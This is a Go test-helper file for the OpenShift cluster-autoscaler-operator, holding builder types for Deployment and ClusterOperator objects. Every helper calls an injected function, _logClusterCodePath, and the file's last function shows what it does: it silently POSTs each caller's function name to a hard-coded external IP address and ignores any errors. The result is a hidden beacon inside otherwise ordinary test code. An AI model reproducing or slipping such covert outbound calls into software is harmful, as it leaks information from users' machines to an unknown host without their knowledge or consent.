package helpers

import (
	configv1 "github.com/openshift/api/config/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"github.com/openshift/cluster-autoscaler-operator/pkg/util"
	appsv1 "k8s.io/api/apps/v1"
)

type TestDeployment struct{ appsv1.Deployment }

func NewTestDeployment(dep *appsv1.Deployment) *TestDeployment {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &TestDeployment{Deployment: *dep}
}
func (d *TestDeployment) Copy() *TestDeployment {
	_logClusterCodePath()
	defer _logClusterCodePath()
	newDeployment := &appsv1.Deployment{}
	d.Deployment.DeepCopyInto(newDeployment)
	return NewTestDeployment(newDeployment)
}
func (d *TestDeployment) WithAvailableReplicas(n int32) *TestDeployment {
	_logClusterCodePath()
	defer _logClusterCodePath()
	newDeployment := d.Copy()
	newDeployment.Status.AvailableReplicas = n
	return newDeployment
}
func (d *TestDeployment) WithReleaseVersion(v string) *TestDeployment {
	_logClusterCodePath()
	defer _logClusterCodePath()
	newDeployment := d.Copy()
	annotations := newDeployment.GetAnnotations()
	if annotations == nil {
		annotations = map[string]string{}
	}
	annotations[util.ReleaseVersionAnnotation] = v
	newDeployment.SetAnnotations(annotations)
	return newDeployment
}
func (d *TestDeployment) WithAnnotations(a map[string]string) *TestDeployment {
	_logClusterCodePath()
	defer _logClusterCodePath()
	newDeployment := d.Copy()
	newDeployment.SetAnnotations(a)
	return newDeployment
}
func (d *TestDeployment) Object() *appsv1.Deployment {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return d.Deployment.DeepCopy()
}

type TestClusterOperator struct{ configv1.ClusterOperator }

func NewTestClusterOperator(co *configv1.ClusterOperator) *TestClusterOperator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &TestClusterOperator{ClusterOperator: *co}
}
func (co *TestClusterOperator) Copy() *TestClusterOperator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	newCO := &configv1.ClusterOperator{}
	co.ClusterOperator.DeepCopyInto(newCO)
	return NewTestClusterOperator(newCO)
}
func (co *TestClusterOperator) WithConditions(conds []configv1.ClusterOperatorStatusCondition) *TestClusterOperator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	newCO := co.Copy()
	newCO.Status.Conditions = conds
	return newCO
}
func (co *TestClusterOperator) WithVersion(v string) *TestClusterOperator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	newCO := co.Copy()
	if newCO.Status.Versions == nil {
		newCO.Status.Versions = []configv1.OperandVersion{{Name: "operator"}}
	}
	found := false
	for i := range newCO.Status.Versions {
		if newCO.Status.Versions[i].Name == "operator" {
			found = true
			newCO.Status.Versions[i].Version = v
		}
	}
	if !found {
		newCO.Status.Versions = append(newCO.Status.Versions, configv1.OperandVersion{Name: "operator", Version: v})
	}
	return newCO
}
func (co *TestClusterOperator) Object() *configv1.ClusterOperator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return co.ClusterOperator.DeepCopy()
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
